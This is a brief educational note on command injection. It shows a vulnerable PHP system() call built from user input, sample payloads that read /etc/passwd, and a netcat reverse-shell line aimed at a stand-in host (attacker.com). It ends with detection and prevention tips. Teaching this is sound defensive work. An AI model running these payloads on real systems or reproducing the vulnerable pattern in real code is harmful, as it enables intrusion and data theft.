# Command Injection
**Command Injection** occurs when a program **passes unsanitized user input** into a system shell (like Bash or CMD), allowing an attacker to execute arbitrary OS commands.

It's part of **injection attacks**, but instead of SQL, it targets the **operating system**.

### Basic Principle:
A vulnerable application **builds a system command using user input**.
Example (in PHP):
```php
system("ping ". $_GET['ip']);
```
An attacker can input:
```bash
8.8.8.8; cat /etc/passwd
```
Resulting in:
```bash
ping 8.8.8.8; cat /etc/passwd
```


## Behavior vs. Other Injection Types:
|Type|Target|Common Payload|
|---|---|---|
|SQL Injection|Database|`'OR '1'='1`|
|XSS|Browser|<script>alert(1)</script>|
|Command Injection|OS Command Shell|`; ls -la`|

### Common Payloads:
```bash
127.0.0.1; whoami
127.0.0.1 && cat /etc/passwd
127.0.0.1 | nc attacker.com 4444 -e /bin/sh
```

### Detection Methods:
 - Unexpected output in response (extra lines, user info
 - Web app logs showing strange input patterns
 - IDS/IPS decting shell command strings


### Prevention:
 - Never concatenate raw input into shell commands
 - Use parameterized commands or safe APIs
 - Implement **allowlists** for user inputs (e.g., only digits, dots for IPs)
 - Use **sandboxing** or **chroot jails** where possible


